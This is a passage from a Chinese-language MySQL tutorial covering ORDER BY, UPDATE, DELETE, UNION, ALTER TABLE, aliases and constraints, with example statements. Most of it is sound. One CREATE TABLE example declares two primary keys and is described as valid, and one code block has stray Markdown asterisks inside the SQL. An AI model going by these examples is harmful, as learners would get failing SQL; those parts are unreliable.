<h4 id="使用表达式排序："><a href="#使用表达式排序：" class="headerlink" title="使用表达式排序："></a>使用表达式排序：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT product_name, price * discount_rate AS discounted_price</span><br><span class="line">FROM products</span><br><span class="line">ORDER BY discounted_price DESC;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择产品表 products 中的产品名称和根据折扣率计算的折扣后价格，并按折扣后价格降序 DESC 排序。</p>
<h4 id="使用-NULLS-FIRST-或-NULLS-LAST-处理-NULL-值："><a href="#使用-NULLS-FIRST-或-NULLS-LAST-处理-NULL-值：" class="headerlink" title="使用 NULLS FIRST 或 NULLS LAST 处理 NULL 值："></a>使用 NULLS FIRST 或 NULLS LAST 处理 NULL 值：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT product_name, price</span><br><span class="line">FROM products</span><br><span class="line">ORDER BY price DESC NULLS LAST;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择产品表 products 中的产品名称和价格，并按价格降序 DESC 排序，将 NULL 值排在最后。</p>
<blockquote>
<p>ORDER BY 子句是一个强大的工具，可以根据不同的业务需求对查询结果进行排序。在实际应用中，注意选择适当的列和排序顺序，以获得符合期望的排序效果。</p>
</blockquote>
<h2 id="UPDATE-语句"><a href="#UPDATE-语句" class="headerlink" title="UPDATE 语句"></a>UPDATE 语句</h2><p>UPDATE 语句用于更新表中的记录。</p>
<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>table_name：是你要更新数据的表的名称。</li>
<li>column1, column2, …：是你要更新的列的名称。</li>
<li>value1, value2, …：是新的值，用于替换旧的值。</li>
<li>WHERE condition：是一个可选的子句，用于指定更新的行。如果省略 WHERE 子句，将更新表中的所有行。</li>
</ul>
<p><strong>更多说明：</strong></p>
<ul>
<li>你可以同时更新一个或多个字段。</li>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以在一个单独表中同时更新数据。</li>
</ul>
<p>当你需要更新数据表中指定行的数据时 WHERE 子句是非常有用的。</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>以下实例演示了如何使用 UPDATE 语句。</p>
<h4 id="更新单个列的值："><a href="#更新单个列的值：" class="headerlink" title="更新单个列的值："></a>更新单个列的值：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE employees</span><br><span class="line">SET salary = 60000</span><br><span class="line">WHERE employee_id = 101;</span><br></pre></td></tr></table></figure>

<h4 id="更新多个列的值："><a href="#更新多个列的值：" class="headerlink" title="更新多个列的值："></a>更新多个列的值：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE orders</span><br><span class="line">SET status = &#x27;Shipped&#x27;, ship_date = &#x27;2023-03-01&#x27;</span><br><span class="line">WHERE order_id = 1001;</span><br></pre></td></tr></table></figure>

<h4 id="使用表达式更新值："><a href="#使用表达式更新值：" class="headerlink" title="使用表达式更新值："></a>使用表达式更新值：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE products</span><br><span class="line">SET price = price * 1.1</span><br><span class="line">WHERE category = &#x27;Electronics&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将每个属于 Electronics 类别的产品的价格都增加了 10%。</p>
<h4 id="更新符合条件的所有行："><a href="#更新符合条件的所有行：" class="headerlink" title="更新符合条件的所有行："></a>更新符合条件的所有行：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE students</span><br><span class="line">SET status = &#x27;Graduated&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将所有学生的状态更新为 Graduated。</p>
<h4 id="更新使用子查询的值："><a href="#更新使用子查询的值：" class="headerlink" title="更新使用子查询的值："></a>更新使用子查询的值：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE customers</span><br><span class="line">SET total_purchases = (</span><br><span class="line">    SELECT SUM(amount)</span><br><span class="line">    FROM orders</span><br><span class="line">    WHERE orders.customer_id = customers.customer_id</span><br><span class="line">)</span><br><span class="line">WHERE customer_type = &#x27;Premium&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句通过子查询计算每个 Premium 类型客户的总购买金额，并将该值更新到 total_purchases 列中。</p>
<blockquote>
<p><strong>注意：</strong> 在使用 UPDATE 语句时，请确保你提供了足够的条件来确保只有你想要更新的行被修改。如果不提供 WHERE 子句，将更新表中的所有行，可能导致不可预测的结果。</p>
</blockquote>
<h2 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h2><p>你可以使用 <strong>DELETE FROM</strong> 命令来删除数据表中的记录。</p>
<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>table_name：是你要删除数据的表的名称。</li>
<li>WHERE condition：是一个可选的子句，用于指定删除的行。如果省略 WHERE 子句，将删除表中的所有行。</li>
</ul>
<p><strong>更多说明：</strong></p>
<ul>
<li>如果没有指定 WHERE 子句，数据表中的所有记录将被删除。</li>
<li>你可以在 WHERE 子句中指定任何条件</li>
<li>您可以在单个表中一次性删除记录。</li>
</ul>
<p>当你想删除数据表中指定的记录时 WHERE 子句是非常有用的。</p>
<h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><p>以下实例演示了如何使用 DELETE 语句。</p>
<h4 id="删除符合条件的行："><a href="#删除符合条件的行：" class="headerlink" title="删除符合条件的行："></a>删除符合条件的行：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM students</span><br><span class="line">WHERE graduation_year = 2021;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句删除了 students 表中所有 graduation_year 为 2021 的学生的记录。</p>
<h4 id="删除所有行："><a href="#删除所有行：" class="headerlink" title="删除所有行："></a>删除所有行：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM orders;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句删除了 orders 表中的所有记录，但表结构保持不变。</p>
<h4 id="使用子查询删除符合条件的行："><a href="#使用子查询删除符合条件的行：" class="headerlink" title="使用子查询删除符合条件的行："></a>使用子查询删除符合条件的行：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM customers</span><br><span class="line">WHERE customer_id IN (</span><br><span class="line">    SELECT customer_id</span><br><span class="line">    FROM orders</span><br><span class="line">    WHERE order_date &lt; &#x27;2023-01-01&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句通过子查询删除了 orders 表中在 2023-01-01 之前下的订单对应的客户。</p>
<blockquote>
<p><strong>注意：</strong> 在使用 DELETE 语句时，请确保你提供了足够的条件来确保只有你想要删除的行被删除。如果不提供 WHERE 子句，将删除表中的所有行，可能导致不可预测的结果。</p>
</blockquote>
<h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h2><p>本教程为大家介绍 MySQL <strong>UNION</strong> 操作符的语法和实例。</p>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。</p>
<p>UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
<h3 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">WHERE condition1</span><br><span class="line">UNION</span><br><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table2</span><br><span class="line">WHERE condition2</span><br><span class="line">[ORDER BY column1, column2, ...];</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, … ：是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li>table1, table2, … ：是你要从中查询数据的表的名称。</li>
<li>condition1, condition2, … ：是每个 <code>SELECT</code> 语句的过滤条件，是可选的。</li>
<li>ORDER BY 子句是一个可选的子句，用于指定合并后的结果集的排序顺序。</li>
</ul>
<h3 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h3><h4 id="基本的-UNION-操作："><a href="#基本的-UNION-操作：" class="headerlink" title="基本的 UNION 操作："></a>基本的 UNION 操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT city FROM customers</span><br><span class="line">UNION</span><br><span class="line">SELECT city FROM suppliers</span><br><span class="line">ORDER BY city;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择客户表和供应商表中所有城市的唯一值，并按城市名称升序排序。</p>
<h4 id="使用过滤条件的-UNION："><a href="#使用过滤条件的-UNION：" class="headerlink" title="使用过滤条件的 UNION："></a>使用过滤条件的 UNION：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT product_name FROM products WHERE category = &#x27;Electronics&#x27;</span><br><span class="line">UNION</span><br><span class="line">SELECT product_name FROM products WHERE category = &#x27;Clothing&#x27;</span><br><span class="line">ORDER BY product_name;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择电子产品和服装类别的产品名称，并按产品名称升序排序。</p>
<h4 id="UNION-操作中的列数和数据类型必须相同："><a href="#UNION-操作中的列数和数据类型必须相同：" class="headerlink" title="UNION 操作中的列数和数据类型必须相同："></a>UNION 操作中的列数和数据类型必须相同：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM employees</span><br><span class="line">UNION</span><br><span class="line">SELECT department_name, NULL FROM departments</span><br><span class="line">ORDER BY first_name;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句中，departments 表中的 department_name 列被映射到了 employees 表中的 last_name 列，但是列数和数据类型必须相同。</p>
<h4 id="使用-UNION-ALL-不去除重复行："><a href="#使用-UNION-ALL-不去除重复行：" class="headerlink" title="使用 UNION ALL 不去除重复行："></a>使用 UNION ALL 不去除重复行：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT city FROM customers</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT city FROM suppliers</span><br><span class="line">ORDER BY city;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句使用 UNION ALL 将客户表和供应商表中的所有城市合并在一起，不去除重复行。</p>
<blockquote>
<p>UNION 操作符在合并结果集时会去除重复行，而 UNION ALL 不会去除重复行，因此 UNION ALL 的性能可能更好，但如果你确实希望去除重复行，可以使用 UNION。</p>
</blockquote>
<h2 id="ALTER-TABLE-命令"><a href="#ALTER-TABLE-命令" class="headerlink" title="ALTER TABLE 命令"></a>ALTER TABLE 命令</h2><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到 ALTER TABLE 命令。</p>
<p>ALTER TABLE 命令用于修改数据库、表和索引等对象的结构。</p>
<p>ALTER TABLE 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作。</p>
<p>ALTER TABLE 命令非常强大，可以在数据库结构发生变化时进行灵活的修改和调整。</p>
<h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><h4 id="添加列"><a href="#添加列" class="headerlink" title="添加列"></a>添加列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD COLUMN new_column_name datatype;</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句在 employees 表中添加了一个名为 birth_date 的日期列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE employees</span><br><span class="line">ADD COLUMN birth_date DATE;</span><br></pre></td></tr></table></figure>

<h4 id="修改列的数据类型"><a href="#修改列的数据类型" class="headerlink" title="修改列的数据类型"></a>修改列的数据类型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE TABLE_NAME</span><br><span class="line">MODIFY COLUMN column_name new_datatype;</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句将 employees 表中的 salary 列的数据类型修改为 DECIMAL(10,2)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE employees</span><br><span class="line">MODIFY COLUMN salary DECIMAL(10,2);</span><br></pre></td></tr></table></figure>

<h4 id="修改列名"><a href="#修改列名" class="headerlink" title="修改列名"></a>修改列名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">CHANGE COLUMN old_column_name new_column_name datatype;</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句将 employees 表中的某个列的名字由 old_column_name 修改为 new_column_name，并且可以同时修改数据类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE employees</span><br><span class="line">CHANGE COLUMN old_column_name new_column_name VARCHAR(255);</span><br></pre></td></tr></table></figure>

<h4 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">DROP COLUMN column_name;</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句将 employees 表中的 birth_date 列删除：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**ALTER** **TABLE** employees</span><br><span class="line">**DROP** **COLUMN** birth_date;</span><br></pre></td></tr></table></figure>

<h4 id="添加-PRIMARY-KEY"><a href="#添加-PRIMARY-KEY" class="headerlink" title="添加 PRIMARY KEY"></a>添加 PRIMARY KEY</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE table_name</span><br><span class="line">ADD PRIMARY KEY (column_name);</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句在 employees 表中添加了一个主键：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE employees</span><br><span class="line">ADD PRIMARY KEY (employee_id);</span><br></pre></td></tr></table></figure>

<h4 id="添加-FOREIGN-KEY"><a href="#添加-FOREIGN-KEY" class="headerlink" title="添加 FOREIGN KEY"></a>添加 FOREIGN KEY</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE child_table</span><br><span class="line">ADD CONSTRAINT fk_name</span><br><span class="line">FOREIGN KEY (column_name)</span><br><span class="line">REFERENCES parent_table (column_name);</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句在 orders 表中添加了一个外键，关联到 customers 表的 customer_id 列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE orders</span><br><span class="line">ADD CONSTRAINT fk_customer</span><br><span class="line">FOREIGN KEY (customer_id)</span><br><span class="line">REFERENCES customers (customer_id);</span><br></pre></td></tr></table></figure>

<h4 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE old_table_name</span><br><span class="line">RENAME TO new_table_name;</span><br></pre></td></tr></table></figure>

<p>以下 SQL 语句将表名由 employees 修改为 staff：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE employees</span><br><span class="line">RENAME TO staff;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>但在使用 <strong>ALTER</strong> 命令时要格外小心，因为一些操作可能需要重建表或索引，这可能会影响数据库的性能和运行时间。在进行重要的结构修改时，建议先备份数据，并在生产环境中谨慎操作。</p>
</blockquote>
<h2 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h2><p>通过使用 SQL，可以为表名称或列名称指定别名。</p>
<hr>
<h2 id="SQL-别名"><a href="#SQL-别名" class="headerlink" title="SQL 别名"></a>SQL 别名</h2><p>通过使用 SQL，可以为表名称或列名称指定别名。</p>
<p>基本上，创建别名是为了让列名称的可读性更强。</p>
<h3 id="列的-SQL-别名语法"><a href="#列的-SQL-别名语法" class="headerlink" title="列的 SQL 别名语法"></a>列的 SQL 别名语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name AS alias_name</span><br><span class="line">FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="表的-SQL-别名语法"><a href="#表的-SQL-别名语法" class="headerlink" title="表的 SQL 别名语法"></a>表的 SQL 别名语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table_name AS alias_name;</span><br></pre></td></tr></table></figure>

<h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p>MySQL 中的约束是用来限制表中数据的规则，防止无效的数据进入到表中，确保数据的完整性和一致性。</p>
<p>约束可以应用在列级别或表级别。</p>
<h3 id="列级约束"><a href="#列级约束" class="headerlink" title="列级约束"></a>列级约束</h3><h4 id="NOT-NULL-非空约束"><a href="#NOT-NULL-非空约束" class="headerlink" title="NOT NULL 非空约束"></a>NOT NULL 非空约束</h4><p>NOT NULL 约束强制列不接受 NULL 值。</p>
<p>NOT NULL 约束强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。</p>
<h5 id="CREATE-TABLE-时添加-NOT-NULL-约束"><a href="#CREATE-TABLE-时添加-NOT-NULL-约束" class="headerlink" title="CREATE TABLE 时添加 NOT NULL 约束"></a>CREATE TABLE 时添加 NOT NULL 约束</h5><p>下面的 SQL 在 student 表创建时在 NAME 列上创建 NOT NULL 约束：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">NAME VARCHAR(30) NOT NULL,</span><br><span class="line">age INT UNIQUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="ALTER-TABLE-时添加-NOT-NULL-约束"><a href="#ALTER-TABLE-时添加-NOT-NULL-约束" class="headerlink" title="ALTER TABLE 时添加 NOT NULL 约束"></a>ALTER TABLE 时添加 NOT NULL 约束</h5><p>在一个已创建的表的 Age 字段中添加 NOT NULL 约束如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student MODIFY Age int NOT NULL;</span><br></pre></td></tr></table></figure>

<p><strong>check</strong></p>
<p>查询学生表的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC student;</span><br></pre></td></tr></table></figure>

<p>添加 NULL 数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,&#x27;张三&#x27;,23);</span><br></pre></td></tr></table></figure>

<h5 id="撤销-NOT-NULL-约束"><a href="#撤销-NOT-NULL-约束" class="headerlink" title="撤销 NOT NULL 约束"></a>撤销 NOT NULL 约束</h5><p>在一个已创建的表的 “Age” 字段中删除 NOT NULL 约束如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student MODIFY Age int NULL;</span><br></pre></td></tr></table></figure>

<p><strong>check</strong></p>
<p>添加 NULL 数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,NULL,25);</span><br></pre></td></tr></table></figure>

<h4 id="DEFAULT-默认值约束"><a href="#DEFAULT-默认值约束" class="headerlink" title="DEFAULT 默认值约束"></a>DEFAULT 默认值约束</h4><p>用于约束该字段有默认值，约束当数据表中某个字段不输入值时，自动为其添加一个已经设置好的值。比如性别。</p>
<h4 id="UNIQUE-唯一约束"><a href="#UNIQUE-唯一约束" class="headerlink" title="UNIQUE 唯一约束"></a>UNIQUE 唯一约束</h4><p>UNIQUE 约束唯一标识数据库表中的每条记录。</p>
<p>UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p>PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。</p>
<p>请注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。</p>
<h5 id="CREATE-TABLE-时的-UNIQUE-约束"><a href="#CREATE-TABLE-时的-UNIQUE-约束" class="headerlink" title="CREATE TABLE 时的 UNIQUE 约束"></a>CREATE TABLE 时的 UNIQUE 约束</h5><p>下面的 SQL 在 student 表创建时在 age 和 NAME 列上创建 UNIQUE 约束：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">NAME VARCHAR(30),</span><br><span class="line">UNIQUE (NAME),</span><br><span class="line">age INT UNIQUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">NAME VARCHAR(30),</span><br><span class="line">age INT,</span><br><span class="line">CONSTRAINT people UNIQUE (NAME,age)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h5 id="ALTER-TABLE-时的-UNIQUE-约束"><a href="#ALTER-TABLE-时的-UNIQUE-约束" class="headerlink" title="ALTER TABLE 时的 UNIQUE 约束"></a>ALTER TABLE 时的 UNIQUE 约束</h5><p>在一个已创建的表的 age 字段中添加 UNIQUE 约束如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student MODIFY age INT UNIQUE;</span><br><span class="line">ALTER TABLE student ADD UNIQUE (age);</span><br></pre></td></tr></table></figure>

<p>命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student ADD CONSTRAINT Person UNIQUE (NAME,age);</span><br></pre></td></tr></table></figure>

<p><strong>check</strong></p>
<p>查询学生表的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC student;</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,&#x27;张三&#x27;,23);</span><br><span class="line">INSERT INTO student VALUES (NULL,&#x27;李四&#x27;,23);</span><br><span class="line">INSERT INTO student VALUES (NULL,&#x27;李四&#x27;,24);</span><br></pre></td></tr></table></figure>

<h5 id="删除-UNIQUE-约束"><a href="#删除-UNIQUE-约束" class="headerlink" title="删除 UNIQUE 约束"></a>删除 UNIQUE 约束</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student DROP INDEX age;</span><br></pre></td></tr></table></figure>

<p><strong>check</strong></p>
<p>查询学生表的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC student;</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,&#x27;李四&#x27;,23);</span><br></pre></td></tr></table></figure>

<h4 id="PRIMARY-KEY-主键约束"><a href="#PRIMARY-KEY-主键约束" class="headerlink" title="PRIMARY KEY 主键约束"></a>PRIMARY KEY 主键约束</h4><p>PRIMARY KEY 约束唯一标识数据库表中的每条记录。</p>
<p>主键必须包含唯一的值。</p>
<p>主键列不能包含 NULL 值。</p>
<p>每个表都应该有一个主键，并且每个表只能有一个主键。</p>
<p>主键约束可以应用在一个或多个列上，通常用来标识表中的主要记录。</p>
<h5 id="CREATE-TABLE-时的-PRIMARY-KEY-约束"><a href="#CREATE-TABLE-时的-PRIMARY-KEY-约束" class="headerlink" title="CREATE TABLE 时的 PRIMARY KEY 约束"></a>CREATE TABLE 时的 PRIMARY KEY 约束</h5><p>下面的 SQL 在 student 表创建时在 id 和 NAME 列上创建 PRIMARY KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY,</span><br><span class="line">NAME VARCHAR(30) NOT NULL,</span><br><span class="line">PRIMARY KEY (NAME),</span><br><span class="line">age INT</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT NOT NULL,</span><br><span class="line">NAME VARCHAR(30) NOT NULL,</span><br><span class="line">age INT,</span><br><span class="line">CONSTRAINT person PRIMARY KEY (id,NAME)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>注：在上面的实例中，只有一个主键 PRIMARY KEY（person）。然而，person 的值是由两个列（id 和 NAME）组成的。</p>
<h5 id="ALTER-TABLE-时的-PRIMARY-KEY-约束"><a href="#ALTER-TABLE-时的-PRIMARY-KEY-约束" class="headerlink" title="ALTER TABLE 时的 PRIMARY KEY 约束"></a>ALTER TABLE 时的 PRIMARY KEY 约束</h5><p>当表已被创建时，在 id 列创建 PRIMARY KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student ADD PRIMARY KEY (id)</span><br></pre></td></tr></table></figure>

<p>命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student ADD CONSTRAINT person PRIMARY KEY (id,NAME)</span><br></pre></td></tr></table></figure>

<p>注：使用 ALTER TABLE 语句添加主键，必须把主键列声明为不包含 NULL 值（在表首次创建时）。</p>
<p><strong>check</strong></p>
<p>查询学生表的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC student;</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (1,&#x27;张三&#x27;,23);</span><br><span class="line">INSERT INTO student VALUES (2,&#x27;李四&#x27;,24);</span><br></pre></td></tr></table></figure>

<h5 id="删除-PRIMARY-KEY-约束"><a href="#删除-PRIMARY-KEY-约束" class="headerlink" title="删除 PRIMARY KEY 约束"></a>删除 PRIMARY KEY 约束</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student DROP PRIMARY KEY;</span><br></pre></td></tr></table></figure>

<h5 id="PRIMARY-KEY-AUTO-INCREMENT-主键自增约束"><a href="#PRIMARY-KEY-AUTO-INCREMENT-主键自增约束" class="headerlink" title="PRIMARY KEY AUTO_INCREMENT 主键自增约束"></a>PRIMARY KEY AUTO_INCREMENT 主键自增约束</h5><p>将添加数据的主键对应的位置改为 Null ，会自动按照数据添加的顺序排序编号</p>
<p>下面的 SQL 在 student 表创建时在 id 列上设为主键自增</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE student(</span><br><span class="line">id INT PRIMARY KEY AUTO_INCREMENT,</span><br><span class="line">NAME VARCHAR(30),</span><br><span class="line">age INT</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>查询学生表的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DESC student;</span><br></pre></td></tr></table></figure>

<p>添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO student VALUES (NULL,&#x27;张三&#x27;,23),(NULL,&#x27;李四&#x27;,24);</span><br></pre></td></tr></table></figure>

<p>删除自增约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student MODIFY id INT;</span><br><span class="line">INSERT INTO student VALUES (NULL,&#x27;张三&#x27;,23);</span><br></pre></td></tr></table></figure>

<p>建表后单独添加自增约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE student MODIFY id INT AUTO_INCREMENT;</span><br></pre></td></tr></table></figure>

<h4 id="CHECK-检查约束"><a href="#CHECK-检查约束" class="headerlink" title="CHECK 检查约束"></a>CHECK 检查约束</h4><p>检查约束用来限制列中的值必须符合指定的条件。检查约束可以应用在一个或多个列上，用来确保数据的合法性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE products (</span><br><span class="line">    product_id INT PRIMARY KEY,</span><br><span class="line">    product_name VARCHAR(50),</span><br><span class="line">    price DECIMAL(10, 2),</span><br><span class="line">    CHECK (price &gt; 0)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="表级约束"><a href="#表级约束" class="headerlink" title="表级约束"></a>表级约束</h3><h4 id="PRIMARY-KEY"><a href="#PRIMARY-KEY" class="headerlink" title="PRIMARY KEY"></a>PRIMARY KEY</h4><h4 id="UNIQUE"><a href="#UNIQUE" class="headerlink" title="UNIQUE"></a>UNIQUE</h4><h4 id="CHECK"><a href="#CHECK" class="headerlink" title="CHECK"></a>CHECK</h4><h4 id="FOREIGN-KEY-外键约束"><a href="#FOREIGN-KEY-外键约束" class="headerlink" title="FOREIGN KEY 外键约束"></a>FOREIGN KEY 外键约束</h4><p>一个表中的 FOREIGN KEY 指向另一个表中的 UNIQUE KEY（唯一约束的键）。</p>
